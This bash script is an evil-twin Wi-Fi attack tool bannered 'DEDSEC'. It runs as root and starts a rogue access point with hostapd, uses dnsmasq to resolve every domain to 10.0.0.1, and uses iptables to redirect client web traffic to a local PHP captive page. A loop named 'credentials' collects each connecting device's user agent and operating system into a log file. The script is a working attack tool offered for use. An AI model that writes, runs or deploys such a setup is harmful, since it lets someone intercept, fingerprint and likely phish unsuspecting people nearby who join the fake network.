#!/bin/bash

ask=">> "
cyan="\033[96m"
error="\033[91m"
green="\033[92m"
success="\033[94m"

function header() {
cat << EOF
 /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
| $$  | $$| $$$$$   | $$  | $$|  $$$$$$ | $$$$$   | $$      
| $$  | $$| $$__/   | $$  | $$ \____  $$| $$__/   | $$      
| $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
| $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
|_______/ |________/|_______/  \______/ |________/ \______/ 
EOF
}

function check_root() {
    if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
        { clear; header; }
        echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGimme root bro\n"
        exit 1
    fi
}

function install_packages() {
    if [[ -f hostapd && -f dnsmasq ]]; then
        clear
    else
        { clear; header; }
        ./packages.sh
    fi
}

function pid_kill() {
    killall hostapd > /dev/null 2>&1
    killall dnsmasq > /dev/null 2>&1
    killall php > /dev/null 2>&1
}

function start_1() {
    systemctl stop NetworkManager.service
    clear
    header
    echo

    ethernet="lo"
    echo "Select wifi-adapter: (with support AP mode)"
    iw dev | grep -e Interface
    read -p "Wifi adapter: " adapter
    wifi="$adapter"

    if [ -f /etc/spoof.hosts ]; then
        mv /etc/spoof.hosts /etc/spoof.BAK
    fi

    cat <<- EOF >> /etc/spoof.hosts
10.0.0.1 $wifi_name
EOF

    echo "Wifi $wifi_name waiting for enable..."
    sleep 3
    echo
}

function get_fingers() {
    User_Agent=$(grep -a 'User-Agent:.*' .www/info.txt | cut -d " " -f2 | tr -d '\r')
    OS_System=$(grep -a 'OS-System:.*' .www/info.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    echo -e "\nUser Agent: $User_Agent"
    echo -e "\nOS System: $OS_System"
    cat .www/info.txt >> info.txt
    echo -ne "\nWaiting for next device Ctrl + C to exit. "
}

function credentials() {
    while true; do
        if [[ -e ".www/info.txt" ]]; then
            get_fingers
            rm -rf .www/info.txt
        fi
        sleep 0.75
    done
}

function attack() {
    clear
    header
    echo
    echo "Starting..."
    
    if [ -f /etc/hostapd/hostapd.conf ]; then
        mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.bak
    fi

    echo "interface=$wifi" >> /etc/hostapd/hostapd.conf
    echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
    echo "ssid=$ap_name" >> /etc/hostapd/hostapd.conf
    echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
    echo "channel=11" >> /etc/hostapd/hostapd.conf
    sleep 1

    if [ -f /etc/dnsmasq.conf ]; then
        mv /etc/dnsmasq.conf /etc/dnsmasq.bak
    fi

    echo "no-resolv" >> /etc/dnsmasq.conf
    echo "interface=$wifi" >> /etc/dnsmasq.conf
    echo "dhcp-range=10.0.0.2,10.0.0.101,12h" >> /etc/dnsmasq.conf
    echo "server=8.8.8.8" >> /etc/dnsmasq.conf
    echo "server=8.8.4.4" >> /etc/dnsmasq.conf
    echo "domain=free.wifi" >> /etc/dnsmasq.conf
    echo "address=/fake.local/10.0.0.1" >> /etc/dnsmasq.conf
    echo "addn-hosts=/etc/spoof.hosts" >> /etc/dnsmasq.conf
    echo "address=/#/10.0.0.1" >> /etc/dnsmasq.conf
    sleep 1

    iptables -t mangle -N captiveportal
    iptables -t mangle -A PREROUTING -i $wifi -p udp --dport 53 -j RETURN
    iptables -t mangle -A PREROUTING -i $wifi -j captiveportal
    iptables -t mangle -A captiveportal -j MARK --set-mark 1
    iptables -t nat -A PREROUTING -i $wifi -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
    iptables -A FORWARD -i $wifi -j ACCEPT
    iptables -t nat -A POSTROUTING -o $ethernet -j MASQUERADE

    ifconfig $wifi up 10.0.0.1 netmask 255.255.255.0
    sleep 3

    if [ -z "$(ps -e | grep dnsmasq)" ]; then
        killall dnsmasq > /dev/null 2>&1
        dnsmasq &
    fi

    sleep 1
    hostapd -B /etc/hostapd/hostapd.conf > /dev/null 2>&1
    host='10.0.0.1'
    port='80'
    cd .www && php -S "$host":"$port" > /dev/null 2>&1 &
    echo -e "[Ctrl + C to exit]"
    credentials

    while true; do
        read $wifi
    done
}

function control_c() {
    echo -e "\nCTRL C\n"
    reset
    exit 1
}

function reset() {
    echo -e "\nReset fake Wifi and exit\n"

    if [ -f /etc/hostapd/hostapd.bak ]; then
        mv /etc/hostapd/hostapd.bak /etc/hostapd/hostapd.conf
    fi

    sleep 1

    if [ -f /etc/dnsmasq.bak ]; then
        mv /etc/dnsmasq.bak /etc/dnsmasq.conf
    fi

    sleep 1

    if [ -f /etc/spoof.bak ]; then
        mv /etc/spoof.bak /etc/spoof.hosts
    fi

    sleep 1

    iptables -t mangle -D PREROUTING -i $wifi -p udp --dport 53 -j RETURN
    iptables -t mangle -D PREROUTING -i $wifi -j captiveportal
    iptables -t mangle -D captiveportal -j MARK --set-mark 1
    iptables -t nat -D PREROUTING -i $wifi -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
    iptables -D FORWARD -i $wifi -j ACCEPT
    iptables -t nat -D POSTROUTING -o $ethernet -j MASQUERADE
    iptables -t nat -F
    iptables -t nat -X
    iptables -t mangle -F
    iptables -t mangle -X

    sleep 1
    systemctl start NetworkManager.service
    service networking restart
    sleep 1
    clear
    exit 1
}

trap control_c SIGINT
check_root
install_packages
pid_kill
start_1
attack
